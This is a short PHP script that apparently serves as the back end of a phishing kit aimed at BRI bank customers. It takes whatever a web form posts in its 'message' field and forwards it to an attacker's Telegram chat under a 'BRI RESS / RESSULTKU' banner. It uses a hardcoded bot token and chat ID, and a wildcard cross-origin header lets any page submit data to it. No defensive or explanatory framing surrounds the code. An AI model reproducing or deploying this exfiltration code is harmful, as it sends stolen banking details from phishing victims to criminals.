<?php
header('Access-Control-Allow-Origin: *');
$token = "7380935140:AAG2W2kxMnUo_Uf1LA7qM98EZ1N5nTepO6Q";
$chatID = "6125949092";
$content = $_POST['message'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"━─━────༺BRI RESS༻────━─━\n\n(BRI | RESSULTKU)\n\n".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
